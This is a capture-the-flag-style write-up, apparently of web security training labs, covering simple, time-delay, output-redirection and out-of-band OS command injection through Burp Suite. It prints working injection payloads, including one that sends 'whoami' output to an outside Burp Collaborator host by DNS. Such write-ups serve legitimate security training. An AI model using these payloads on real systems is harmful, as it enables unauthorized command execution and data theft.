# OS command injection, simple case
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5fe1257e-aa10-4808-9456-07dc312be969)

Navigate to the website, 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6801b2fd-9ba6-4dfd-9da5-9504da42bb14)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/65bc6550-551a-4063-bdcf-116f9d6b0220)

Capture this request on burpsuite and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c6e53c61-e24c-4e25-a8e5-641059dcc47d)

So the vulnerability lies in the storeId function.

Checking payload all things I saw something on chaining commands, we can execute the ```whoami``` command by chaining it. So, we'll have something like this
```
storeId=1|whoami
```
Trying this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7eef72bb-d17b-4a48-880e-5c44fc12368e)

So we got the name of the current user.

Checking the response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5c8d3284-eab1-48c8-8515-1ea3bd6c0280)

We have successfully completed the task

------------------------

# Blind OS command injection with time delays
<hr> 

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c2703689-8242-4165-a963-3c3a10f784c7)

Navigate to the webpage,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cc8c94cc-1e7d-4212-9528-be5e103cf7b0)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fe35f794-dfde-41c4-8382-c396458e1120)

Lets capture this request and send it over to burp intruder

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e432dc1d-c393-4f04-a888-cb3f9490f4f5)

We were told the vulnerability is in the feedback function. We'll be injecting the email section. we can use this payload to cause a 10 second delay
```
||ping -c 10 127.0.0.1||
```
Applying that payload and ensuring it is url encoded

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/baa7354a-3ff3-4511-89fb-5dd0fa884613)

Checking the response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7c60d089-0eff-426b-a40b-373969423ad6)

We have successfully completed the task for this lab.

-------------------------------------

# Blind OS command injection with output redirection
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b10aa245-fd9c-4860-875b-9b551fe50fb6)

Navigate to the webpage,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/50dd66e9-7259-4b7e-88a1-8e392a22f1d7)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/29482e08-8050-48bd-933d-8d863f08c3cc)

Capturing this request on burpsuite and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ccbd0a4a-dbd4-4672-8001-7d891bcf0bbc)

Now, we were given the writable folder to be ```/var/www/images``` and we are to execute the ```whoami``` command and then retrieve the output. So to write to that folder we can use the payload
```
||whoami > /var/www/images/abeg.txt||
```
Ensure this is url encoded

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/52142d1b-dea3-4b0f-9398-4919c6d0dad5)

Lets try to view an image, we'll be capturing this request on burpsuite and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5e20f52c-9ab0-4e84-8811-2d9ad311d08a)

Now the file we wrote the ```whoami``` command to earlier was ```abeg.txt```, so we'll be changing the name of the image to ```abeg.txt```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e4559180-7927-4715-bf87-c6424faf6935)

Cool, the command got executed successfully. 

Checking our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/257f6306-c586-4e38-99e6-bf8d76839e97)

We have successfully solved this lab.

-------------------------

# Blind OS command injection with out-of-band interaction
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ae96badf-72cb-400b-b270-8c704e0373f5)

Navigate to the webpage,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ac7e3195-6efd-460d-b369-40e0886ed896)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/90e46c2b-b787-4cb6-a677-12b5553a9096)

Capture this request on burpsuite and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/64fd3693-d050-4455-bd98-7053b2bba741)

so, to solve this lab we have to issue a DNS lookup to burp collaborator

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4fab75bf-9313-402e-b06c-527560ceff3e)

Click on "copy to clipboard" to copy the payload to use. So we can use ```nslookup``` with the payload burp collaborator client generated for us
```
||nslookup 2ad7n17mkusj9u18hveevnj8zz5pte.oastify.com||
```
Ensure it is url encoded

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/10a8d6f5-7a53-4978-bb60-7cc1a6b4e298)

Checking the burp collaborator client window

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b30d0fcf-e2f0-48af-ab0d-fde372a9626e)

We have successfully sent a DNS query

Checking the webpage again,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/714cb00f-8d68-4769-b89f-3c86d4376771)

We have successfully solved the task

------------------------------------

# Blind OS command injection with out-of-band data exfiltration
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/75918da9-62b0-436b-89f7-12adc8709650)

Navigate to the website,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7ed04485-449b-4307-91d3-d71e74400bd1)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dff1fe06-5e81-43d6-a857-33dfffd16b3a)

Capture this request on burpsuite and send it over to burp repeater

We have execute the ```whoami``` command and exfiltrate the output via a DNS query to Burp Collaborator.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dadea7c1-49d2-4eb5-a83e-2016d7a902ce)

Click on "copy to clipboard" to copy the payload to use. So we can use ```nslookup``` with the payload burp collaborator client generated for us to run the ```whoami``` command.

We can use the payload
```
||nslookup `whoami`.8clpqlx6r4oe0u0r87hwrnkonft5hu.oastify.com||
```
Ensure this is url encoded

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6ef52828-66de-4f38-9bce-de0b2543420e)

We got the name of the current  user to be ```peter-WmKLbv```. 

Submitting this name

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a91d42c5-bcb6-4931-8bc2-e3e50d04c4b1)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2be1cde7-c4b1-4625-a8a4-ee0bbb22cb88)

We have successfully completed this lab😎












